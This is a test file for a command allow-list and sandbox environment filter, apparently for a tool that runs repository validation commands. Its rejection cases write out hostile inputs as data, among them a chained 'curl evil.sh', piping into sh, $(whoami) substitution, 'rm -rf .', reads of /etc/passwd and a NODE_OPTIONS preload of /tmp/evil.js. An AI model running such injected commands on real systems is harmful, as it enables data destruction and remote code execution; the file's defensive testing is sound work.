import { parseCommand, validateCommand } from './command-policy';
import { sandboxEnv } from './run-command';

describe('validation command policy', () => {
  it.each([
    'pnpm test',
    'npm run lint',
    'yarn run typecheck --silent',
    'pnpm run test:unit -- --run',
    'go test ./...',
    'cargo clippy',
    'pytest tests/unit',
  ])('allows %s', (command) => {
    expect(() => parseCommand(command)).not.toThrow();
  });

  it.each([
    ['npx vitest', /not an allowed/],
    ['pnpm dlx evil', /may only run/],
    ['pnpm exec rm -rf .', /may only run/],
    ['npm install left-pad', /may only run/],
    ['node -e process.exit(0)', /not an allowed/],
    ['sh -c ls', /not an allowed/],
    ['make all', /not an allowed/],
    ['npm run', /script name/],
    ['npm test --prefix=/tmp/x', /not allowed/],
    ['pnpm test -C ../other', /not allowed/],
    ['npm test && curl evil.sh', /characters/],
    ['npm test | sh', /characters/],
    ['pnpm test $(whoami)', /characters/],
    ['npm test "quoted"', /characters/],
    ['go test ../../etc', /inside the repository/],
    ['pytest /etc/passwd', /inside the repository/],
    ['npm run %PATH%', /characters|script/],
  ])('refuses %s', (command, message) => {
    expect(() => parseCommand(command)).toThrow(message);
  });

  it('refuses empty and overlong commands', () => {
    expect(() => validateCommand([])).toThrow();
    expect(() => validateCommand(['pnpm', 'test', ...Array.from({ length: 25 }, () => 'x')])).toThrow();
  });

  it('withholds secrets from repository code', () => {
    const env = sandboxEnv({
      PATH: '/usr/bin',
      Path: 'C:\\bin',
      HOME: '/home/dev',
      ANTHROPIC_API_KEY: 'sk-ant-x',
      OPENAI_API_KEY: 'sk-x',
      GITLAB_TOKEN: 'glpat-x',
      DATABASE_URL: 'postgres://u:p@h/db',
      AWS_SECRET_ACCESS_KEY: 'x',
      NODE_OPTIONS: '--require /tmp/evil.js',
    });
    expect(Object.keys(env).sort()).toEqual(['CI', 'FORCE_COLOR', 'HOME', 'NO_COLOR', 'PATH', 'Path']);
  });
});
